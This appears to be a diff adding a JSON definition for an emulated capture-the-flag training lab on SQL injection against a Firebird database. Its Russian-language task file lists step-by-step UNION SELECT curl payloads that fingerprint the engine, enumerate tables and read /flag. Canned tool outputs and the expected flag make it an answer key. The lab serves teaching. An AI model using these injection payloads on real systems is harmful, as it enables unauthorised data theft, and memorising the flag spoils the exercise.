@@ -1,0 +1,42 @@
+{
+  "id": "web-firebird",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{f1r3b1rd_rdb_m3t4d4t4}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Firebird SQLi\n\nЭндпоинт /invoice?id= уязвим, СУБД — Firebird.\n\n1. Подтверди диалект:\n   curl -s \"https://app.target/invoice?id=1 UNION SELECT rdb$get_context('SYSTEM','ENGINE_VERSION'),2 FROM rdb$database-- -\"\n2. Сними таблицы:\n   curl -s \"https://app.target/invoice?id=1 UNION SELECT rdb$relation_name,2 FROM rdb$relations-- -\"\n3. Прочитай флаг через функцию чтения файла:\n   curl -s \"https://app.target/invoice?id=1 UNION SELECT read_file('/flag'),2 FROM rdb$database-- -\"\n4. Запиши флаг в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/invoice)",
+      "cases": [
+        {
+          "match": "rdb\\$get_context|rdb\\$database",
+          "example": "-s '.../invoice?id=1 UNION SELECT rdb$get_context(...),2 FROM rdb$database-- -'",
+          "output": "4.0.0\n"
+        },
+        {
+          "match": "rdb\\$relations",
+          "example": "-s '.../invoice?id=1 UNION SELECT rdb$relation_name,2 FROM rdb$relations-- -'",
+          "output": "USERS\nINVOICES\n"
+        },
+        {
+          "match": "read_file|/flag",
+          "example": "-s '.../invoice?id=1 UNION SELECT read_file('/flag'),2 FROM rdb$database-- -'",
+          "output": "nto{f1r3b1rd_rdb_m3t4d4t4}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /invoice на app.target.\n"
+    }
+  }
+}
